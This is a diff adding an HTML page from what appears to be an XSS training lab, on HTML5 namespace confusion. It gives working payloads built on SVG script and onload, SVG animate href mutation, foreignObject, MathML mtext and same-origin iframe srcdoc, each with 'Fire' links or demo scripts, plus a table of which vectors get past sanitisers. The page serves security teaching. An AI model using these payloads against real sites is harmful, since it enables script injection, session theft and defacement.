@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Attack 04 — Namespace Confusion</title>
+  <style>
+    :root{--bg:#0b0f1a;--bg2:#111827;--card:#141c2e;--border:#1e3a5f;
+          --gold:#f5c842;--cyan:#38bdf8;--purple:#a78bfa;--red:#f87171;
+          --green:#4ade80;--orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf}
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{background:var(--bg);color:var(--text);font-family:-apple-system,sans-serif;padding:32px}
+    .wrap{max-width:860px;margin:0 auto}
+    h1{font-size:28px;color:var(--gold);margin-bottom:6px}
+    .subtitle{color:var(--muted);font-size:14px;margin-bottom:32px}
+    h2{font-size:16px;color:var(--cyan);margin:0 0 14px}
+    .step{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:22px 24px;margin-bottom:16px}
+    .step-header{display:flex;align-items:baseline;gap:12px;margin-bottom:12px}
+    .step-num{background:var(--border);color:var(--cyan);font-size:11px;font-weight:700;
+              width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+    .step-title{font-size:14px;font-weight:700;color:var(--text)}
+    .step p{font-size:13.5px;color:var(--muted);line-height:1.6;margin-bottom:10px}
+    .payload{background:#060d1a;border:1px solid var(--border);border-radius:4px;
+             padding:10px 14px;font-family:'Courier New',monospace;font-size:12.5px;
+             color:var(--orange);margin:8px 0;word-break:break-all}
+    .btn{display:inline-block;padding:8px 16px;border:none;border-radius:4px;cursor:pointer;
+         font-size:13px;font-weight:600;margin:4px 4px 4px 0;text-decoration:none}
+    .btn-fire{background:#4a1515;color:var(--red);border:1px solid var(--red)}
+    .btn-fire:hover{background:#5a1515}
+    .btn-safe{background:#0a1f13;color:var(--green);border:1px solid var(--green)}
+    .btn-safe:hover{background:#0d2918}
+    .btn-neutral{background:var(--bg2);color:var(--muted);border:1px solid var(--border)}
+    .result-box{min-height:60px;background:#060d1a;border:2px dashed var(--border);
+                border-radius:4px;padding:10px;font-size:12px;margin-top:8px;
+                color:var(--muted);font-family:'Courier New',monospace}
+    .tag{display:inline-block;font-size:10px;font-weight:700;padding:2px 7px;border-radius:3px;letter-spacing:.08em;margin-bottom:8px}
+    .tag-danger{background:#2d0a0a;color:var(--red);border:1px solid var(--red)}
+    .tag-note{background:#0f1f3a;color:var(--cyan);border:1px solid var(--border)}
+    .tag-namespace{background:#1a0a2e;color:var(--purple);border:1px solid var(--purple)}
+    table{width:100%;border-collapse:collapse;font-size:12.5px;margin-top:12px}
+    th{background:var(--bg2);color:var(--cyan);padding:8px 10px;text-align:left;border-bottom:1px solid var(--border)}
+    td{padding:8px 10px;border-bottom:1px solid var(--border);vertical-align:top}
+    td:first-child{font-family:'Courier New',monospace;color:var(--orange);white-space:nowrap}
+    code{font-family:'Courier New',monospace;font-size:11.5px;background:#060d1a;color:var(--cyan);padding:1px 4px;border-radius:2px}
+    .nav{display:flex;justify-content:space-between;align-items:center;margin-bottom:28px;font-size:13px;color:var(--muted)}
+    .nav a{color:var(--cyan);text-decoration:none}
+    .side-by-side{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px}
+    .side-box{background:#060d1a;border:1px solid var(--border);border-radius:4px;padding:10px}
+    .side-box label{font-size:10px;color:var(--muted);display:block;margin-bottom:6px;text-transform:uppercase;letter-spacing:.06em}
+  </style>
+</head>
+<body>
+<div class="wrap">
+  <nav class="nav">
+    <a href="/">← Lab Home</a>
+    <span>Module 07 — Namespace Confusion</span>
+  </nav>
+
+  <h1>Attack 04 — Tag & Namespace Confusion</h1>
+  <p class="subtitle">
+    The HTML5 parser runs in three namespaces: HTML, SVG, and MathML.
+    Switching between them changes parsing rules in ways that sanitisers frequently miss.
+  </p>
+
+  <!-- ─── Step 1 ─── -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">1</div>
+      <div class="step-title">SVG: script tag executes (unlike innerHTML)</div></div>
+    <span class="tag tag-namespace">SVG namespace</span>
+    <p>
+      In Module 05 we saw that <code>&lt;script&gt;</code> tags injected via
+      <code>innerHTML</code> do not execute. This restriction applies only to
+      <em>HTML</em> namespace parsing. When a <code>&lt;script&gt;</code> tag
+      appears inside an <code>&lt;svg&gt;</code> element in server-rendered HTML,
+      the HTML5 parser treats it as a foreign-content script and <strong>it does execute</strong>.
+    </p>
+    <div class="payload">/svg-inject?q=&lt;script&gt;alert('SVG script — executed in ' + document.domain)&lt;/script&gt;</div>
+    <a class="btn btn-fire" href="/svg-inject?q=<script>alert('SVG script — executed in ' + document.domain)</script>" target="_blank">Fire on server</a>
+    <button class="btn btn-safe" onclick="demoSvgScript()">Demo in DOM (innerHTML)</button>
+    <div class="side-by-side">
+      <div class="side-box"><label>Via innerHTML (blocked)</label><div id="svg-inner-result" style="font-size:12px;color:#7a9bbf">Click Demo in DOM</div></div>
+      <div class="side-box"><label>Via server-rendered HTML (fires)</label><div style="font-size:12px;color:#4ade80">Click "Fire on server" → script runs</div></div>
+    </div>
+  </div>
+
+  <!-- ─── Step 2 ─── -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">2</div>
+      <div class="step-title">SVG onload — zero interaction</div></div>
+    <span class="tag tag-danger">ZERO INTERACTION</span>
+    <p>
+      <code>&lt;svg onload=...&gt;</code> fires the moment the SVG element is
+      parsed. This is the single most portable zero-interaction vector: it works
+      in server-rendered HTML, in innerHTML injection (via onload on the svg tag),
+      and in stored XSS contexts.
+    </p>
+    <div class="payload">/svg-inject?q=&lt;/svg&gt;&lt;svg onload=alert(document.domain)&gt;</div>
+    <a class="btn btn-fire" href="/svg-inject?q=</svg><svg onload=alert(document.domain)>" target="_blank">Fire</a>
+    <p style="font-size:12px;color:var(--muted);margin-top:8px">
+      The <code>&lt;/svg&gt;</code> prefix closes the existing SVG tag, placing the
+      new <code>&lt;svg onload=...&gt;</code> in HTML context where onload fires normally.
+    </p>
+  </div>
+
+  <!-- ─── Step 3 ─── -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">3</div>
+      <div class="step-title">SVG animate/set — scriptless execution</div></div>
+    <span class="tag tag-namespace">SVG namespace</span>
+    <span class="tag tag-danger" style="margin-left:4px">ZERO INTERACTION</span>
+    <p>
+      SVG has its own animation elements: <code>&lt;animate&gt;</code>,
+      <code>&lt;set&gt;</code>, and <code>&lt;animateTransform&gt;</code>.
+      These can target attributes on other elements — including event handler
+      attributes. Setting an attribute like <code>onmouseover</code> via
+      animation bypasses sanitisers that check attribute values at parse time
+      but do not account for post-parse mutations.
+    </p>
+    <div class="payload">&lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=javascript:alert(1) /&gt;&lt;text y=20&gt;click&lt;/text&gt;&lt;/a&gt;&lt;/svg&gt;</div>
+    <button class="btn btn-fire" onclick="demoSvgAnimate()">Inject SVG animate</button>
+    <button class="btn btn-neutral" onclick="clearSvgAnimate()">Clear</button>
+    <div class="result-box" id="svg-animate-result">Inject, then click the "click" text that appears.</div>
+  </div>
+
+  <!-- ─── Step 4 ─── -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">4</div>
+      <div class="step-title">SVG foreignObject — HTML island inside SVG</div></div>
+    <span class="tag tag-namespace">SVG → HTML namespace switch</span>
+    <p>
+      <code>&lt;foreignObject&gt;</code> is an SVG element that embeds an HTML
+      (or other namespace) document inside SVG. The embedded content is parsed
+      in HTML namespace — all HTML XSS vectors apply. A sanitiser operating
+      on SVG elements that does not recurse into <code>foreignObject</code>
+      misses the embedded HTML entirely.
+    </p>
+    <div class="payload">&lt;svg&gt;&lt;foreignObject width=100% height=100%&gt;&lt;body xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;img src=x onerror=alert('foreignObject — HTML inside SVG')&gt;&lt;/body&gt;&lt;/foreignObject&gt;&lt;/svg&gt;</div>
+    <button class="btn btn-fire" onclick="demoForeignObject()">Inject foreignObject</button>
+    <button class="btn btn-neutral" onclick="clearFO()">Clear</button>
+    <div class="result-box" id="fo-result">The onerror fires in HTML context embedded inside SVG.</div>
+  </div>
+
+  <!-- ─── Step 5 ─── -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">5</div>
+      <div class="step-title">MathML — event handler on mtext</div></div>
+    <span class="tag tag-namespace">MathML namespace</span>
+    <p>
+      MathML elements support event handler attributes. <code>&lt;mtext&gt;</code>
+      is a common injection target — it accepts HTML content as children,
+      creating a namespace boundary that some sanitisers fail to traverse correctly.
+    </p>
+    <div class="payload">/math-inject?q=&lt;mtext&gt;&lt;img src=x onerror=alert('MathML injection')&gt;&lt;/mtext&gt;</div>
+    <a class="btn btn-fire" href="/math-inject?q=<mtext><img src=x onerror=alert('MathML injection')></mtext>" target="_blank">Fire on server</a>
+  </div>
+
+  <!-- ─── Step 6 ─── -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">6</div>
+      <div class="step-title">iframe srcdoc — same-origin script execution</div></div>
+    <span class="tag tag-danger">SAME-ORIGIN ACCESS</span>
+    <p>
+      An iframe with <code>srcdoc</code> and no <code>sandbox</code> attribute
+      (or with <code>sandbox="allow-scripts allow-same-origin"</code>) runs
+      in the <em>same origin</em> as the parent. Any script executing inside
+      it has full access to <code>parent.document</code>, <code>parent.localStorage</code>,
+      and <code>parent.document.cookie</code>. This is more dangerous than a
+      <code>data:</code> iframe (which runs in null origin).
+    </p>
+    <div class="payload">/iframe-inject?q=&lt;script&gt;parent.document.title='HIJACKED by srcdoc script';&lt;/script&gt;</div>
+    <a class="btn btn-fire" href="/iframe-inject?q=<script>parent.document.title='HIJACKED by srcdoc script';</script>" target="_blank">Fire on server</a>
+    <p style="font-size:12px;color:var(--muted);margin-top:8px">
+      After firing, check the browser tab title — the iframe script modified the parent's <code>document.title</code> via <code>parent.document</code>.
+    </p>
+  </div>
+
+  <!-- ─── Step 7 ─── -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">7</div>
+      <div class="step-title">Namespace Reference Table</div></div>
+    <span class="tag tag-note">Reference</span>
+    <p>Vectors available in each namespace and whether they survive <code>innerHTML</code> injection.</p>
+    <table>
+      <thead><tr><th>Vector</th><th>Namespace</th><th>Works via innerHTML?</th><th>Works server-rendered?</th><th>Interaction needed?</th></tr></thead>
+      <tbody>
+        <tr><td>&lt;script&gt;</td><td>HTML</td><td style="color:var(--red)">No</td><td style="color:var(--green)">Yes</td><td>No</td></tr>
+        <tr><td>&lt;svg&gt;&lt;script&gt;</td><td>SVG (foreign)</td><td style="color:var(--red)">No</td><td style="color:var(--green)">Yes</td><td>No</td></tr>
+        <tr><td>&lt;svg onload&gt;</td><td>SVG</td><td style="color:var(--green)">Yes</td><td style="color:var(--green)">Yes</td><td>No</td></tr>
+        <tr><td>&lt;img onerror&gt;</td><td>HTML</td><td style="color:var(--green)">Yes</td><td style="color:var(--green)">Yes</td><td>No</td></tr>
+        <tr><td>&lt;svg&gt;&lt;animate&gt;</td><td>SVG</td><td style="color:var(--green)">Yes</td><td style="color:var(--green)">Yes</td><td>Click on animated element</td></tr>
+        <tr><td>&lt;svg&gt;&lt;foreignObject&gt;</td><td>SVG→HTML</td><td style="color:var(--green)">Yes</td><td style="color:var(--green)">Yes</td><td>Depends on payload</td></tr>
+        <tr><td>&lt;math&gt;&lt;mtext&gt;</td><td>MathML→HTML</td><td style="color:var(--green)">Yes</td><td style="color:var(--green)">Yes</td><td>No (with onerror)</td></tr>
+        <tr><td>iframe srcdoc</td><td>HTML (same-origin)</td><td>N/A (attribute)</td><td style="color:var(--green)">Yes</td><td>No</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+</div>
+
+<script>
+function demoSvgScript() {
+  const result = document.getElementById("svg-inner-result");
+  const div = document.createElement("div");
+  // script inside svg via innerHTML — does NOT execute
+  div.innerHTML = '<svg><script>document.getElementById("svg-inner-result").textContent = "FIRED (this would be XSS)";<\/script></svg>';
+  document.body.appendChild(div);
+  setTimeout(() => {
+    if (result.textContent === "Click Demo in DOM") {
+      result.textContent = "Script did NOT fire — innerHTML blocks <script> even in SVG context via innerHTML";
+      result.style.color = "#4ade80";
+    }
+    div.remove();
+  }, 200);
+}
+
+function demoSvgAnimate() {
+  document.getElementById("svg-animate-result").innerHTML =
+    '<svg style="display:block"><a><animate attributeName="href" values="javascript:alert(\'SVG animate → href mutation fired\')" /><text y="20" fill="#f5c842" font-size="14" style="cursor:pointer">Click this text (href mutated by animate)</text></a></svg>';
+}
+
+function clearSvgAnimate() {
+  const r = document.getElementById("svg-animate-result");
+  r.innerHTML = "";
+  r.textContent = "Cleared.";
+}
+
+function demoForeignObject() {
+  document.getElementById("fo-result").innerHTML =
+    '<svg width="0" height="0"><foreignObject width="100%" height="100%">' +
+    '<body xmlns="http://www.w3.org/1999/xhtml">' +
+    '<img src=x onerror="document.getElementById(\'fo-result\').style.borderColor=\'#f87171\';document.getElementById(\'fo-result\').insertAdjacentText(\'beforeend\',\' — onerror fired inside foreignObject!\')">' +
+    '</body></foreignObject></svg>';
+}
+
+function clearFO() {
+  const r = document.getElementById("fo-result");
+  r.innerHTML = "";
+  r.style.borderColor = "";
+  r.textContent = "Cleared.";
+}
+</script>
+</body>
+</html>
